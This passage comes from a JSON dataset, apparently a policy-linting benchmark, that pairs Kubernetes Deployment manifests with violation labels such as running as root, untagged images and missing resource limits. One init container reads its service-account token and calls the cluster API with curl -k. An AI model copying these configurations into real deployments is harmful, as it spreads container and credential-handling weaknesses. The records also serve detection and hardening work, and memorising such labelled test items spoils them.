name: varlibdockercontainers\n      - hostPath:\n          path: /var/lib/fluent-bit\n          type: DirectoryOrCreate\n        name: tail-db\n      - configMap:\n          defaultMode: 420\n          name: fluent-bit\n        name: config\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"fluent-bit\" is not set to runAsNonRoot"
  },
  {
    "id": "9588",
    "manifest_path": "data/manifests/the_stack_sample/sample_3660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rogoyalaks1-5582\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rogoyalaks1-5582\n  template:\n    metadata:\n      labels:\n        app: rogoyalaks1-5582\n    spec:\n      containers:\n      - name: rogoyalaks1-5582\n        image: rogoyalacr.azurecr.io/rogoyalaks1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"rogoyalaks1-5582\" is using an invalid container image, \"rogoyalacr.azurecr.io/rogoyalaks1\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9589",
    "manifest_path": "data/manifests/the_stack_sample/sample_3660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rogoyalaks1-5582\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rogoyalaks1-5582\n  template:\n    metadata:\n      labels:\n        app: rogoyalaks1-5582\n    spec:\n      containers:\n      - name: rogoyalaks1-5582\n        image: rogoyalacr.azurecr.io/rogoyalaks1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-anti-affinity",
    "violation_text": "object has 2 replicas but does not specify inter pod anti-affinity"
  },
  {
    "id": "9590",
    "manifest_path": "data/manifests/the_stack_sample/sample_3660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rogoyalaks1-5582\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rogoyalaks1-5582\n  template:\n    metadata:\n      labels:\n        app: rogoyalaks1-5582\n    spec:\n      containers:\n      - name: rogoyalaks1-5582\n        image: rogoyalacr.azurecr.io/rogoyalaks1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"rogoyalaks1-5582\" does not have a read-only root file system"
  },
  {
    "id": "9591",
    "manifest_path": "data/manifests/the_stack_sample/sample_3660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rogoyalaks1-5582\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rogoyalaks1-5582\n  template:\n    metadata:\n      labels:\n        app: rogoyalaks1-5582\n    spec:\n      containers:\n      - name: rogoyalaks1-5582\n        image: rogoyalacr.azurecr.io/rogoyalaks1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"rogoyalaks1-5582\" is not set to runAsNonRoot"
  },
  {
    "id": "9592",
    "manifest_path": "data/manifests/the_stack_sample/sample_3660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rogoyalaks1-5582\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rogoyalaks1-5582\n  template:\n    metadata:\n      labels:\n        app: rogoyalaks1-5582\n    spec:\n      containers:\n      - name: rogoyalaks1-5582\n        image: rogoyalacr.azurecr.io/rogoyalaks1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"rogoyalaks1-5582\" has cpu request 0"
  },
  {
    "id": "9593",
    "manifest_path": "data/manifests/the_stack_sample/sample_3660.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: rogoyalaks1-5582\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: rogoyalaks1-5582\n  template:\n    metadata:\n      labels:\n        app: rogoyalaks1-5582\n    spec:\n      containers:\n      - name: rogoyalaks1-5582\n        image: rogoyalacr.azurecr.io/rogoyalaks1\n        ports:\n        - containerPort: 80\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"rogoyalaks1-5582\" has memory limit 0"
  },
  {
    "id": "9594",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"init-network-env\" is using an invalid container image, \"microhq/curljq\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9595",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"network\" is using an invalid container image, \"micro/micro\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "9596",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"init-network-env\" does not have a read-only root file system"
  },
  {
    "id": "9597",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"network\" does not have a read-only root file system"
  },
  {
    "id": "9598",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"init-network-env\" is not set to runAsNonRoot"
  },
  {
    "id": "9599",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"network\" is not set to runAsNonRoot"
  },
  {
    "id": "9600",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_DOMAIN\n          value: network.micro.mu\n        command:\n        - sh\n        - -c\n        args:\n        - export ADDRESS=\"$(cat /node_info/ip):$MICRO_NETWORK_SVC_NODE_PORT\"; /micro\n          network --gateway=\"$ADDRESS\" --advertise=\"$ADDRESS\"\n        image: micro/micro\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        ports:\n        - containerPort: 8080\n          name: service-port\n        - containerPort: 8085\n          name: network-port\n          protocol: UDP\n      initContainers:\n      - name: init-network-env\n        env:\n        - name: POD_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        image: microhq/curljq\n        imagePullPolicy: Always\n        volumeMounts:\n        - name: shared-data\n          mountPath: /node_info\n        command:\n        - sh\n        - -c\n        args:\n        - 'TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token); curl\n          -k -X GET -H \"Authorization: Bearer $TOKEN\" https://$KUBERNETES_SERVICE_HOST/api/v1/namespaces/$POD_NAMESPACE/services/micro-network\n          | jq -r ''if .status.loadBalancer.ingress[0].hostname != null then .status.loadBalancer.ingress[0].hostname\n          else .status.loadBalancer.ingress[0].ip end'' > /node_info/ip'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"init-network-env\" has cpu request 0"
  },
  {
    "id": "9601",
    "manifest_path": "data/manifests/the_stack_sample/sample_3661.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: micro-network\n  labels:\n    micro: runtime\n    name: micro-network\n  annotations:\n    name: go.micro.network\n    version: latest\n    source: github.com/micro-in-cn/x-gateway\n    owner: micro\n    group: micro\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      name: micro-network\n      micro: runtime\n  template:\n    metadata:\n      labels:\n        name: micro-network\n        micro: runtime\n    spec:\n      affinity:\n        podAntiAffinity:\n          preferredDuringSchedulingIgnoredDuringExecution:\n          - weight: 100\n            podAffinityTerm:\n              labelSelector:\n                matchExpressions:\n                - key: name\n                  operator: In\n                  values:\n                  - micro-network\n              topologyKey: kubernetes.io/hostname\n      volumes:\n      - name: shared-data\n        emptyDir: {}\n      containers:\n      - name: network\n        env:\n        - name: MICRO_NETWORK_TOKEN\n          value: micro.mu\n        - name: MICRO_NETWORK_ADVERTISE_STRATEGY\n          value: best\n        - name: MICRO_LOG_LEVEL\n          value: debug\n        - name: MICRO_BROKER\n          value: nats\n        - name: MICRO_BROKER_ADDRESS\n          value: nats-cluster\n        - name: MICRO_REGISTRY\n          value: etcd\n        - name: MICRO_REGISTRY_ADDRESS\n          value: etcd-cluster-client\n        - name: MICRO_SERVER_ADDRESS\n          value: 0.0.0.0:8080\n        - name: MICRO_NETWORK_NODES\n          value: network.micro.mu\n        - name: MICRO_NETWORK_SVC_NODE_PORT\n          value: '8085'\n        - name: MICRO_NETWORK_DNS_REMOVE_DOMAIN\n          value: network.micro.mu\n        - name: MICRO_NETWORK_DNS_REMOVE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: dns-shared-secret\n        - name: MICRO_NETWORK_DNS_ADVERTISE_TOKEN\n          valueFrom:\n            secretKeyRef:\n              key: DNS_SHARED_SECRET\n              name: 